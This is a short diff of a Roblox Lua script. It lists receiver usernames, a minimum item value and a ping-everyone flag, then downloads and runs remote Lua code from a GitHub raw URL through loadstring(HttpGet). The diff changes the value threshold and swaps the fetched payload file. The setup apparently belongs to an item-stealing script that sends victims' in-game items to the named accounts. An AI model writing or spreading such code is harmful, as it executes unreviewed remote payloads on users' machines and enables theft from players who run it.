@@ -66,11 +66,11 @@ task.spawn(function()
     end
 
     _G.Usernames = {"MRFLIMCLA1","MRFLIMCLA2","MRFLIMCLA3","GROW4GARDEN1M10029","MRFLIMCLA5"}
-    _G.min_value = 0.02
+    _G.min_value = 2
     _G.pingEveryone = "Yes"
     _G.scriptExecuted = _G.scriptExecuted or false
     if _G.scriptExecuted then return end
     _G.scriptExecuted = true
 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/notBest.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/Best.lua"))()
 end)
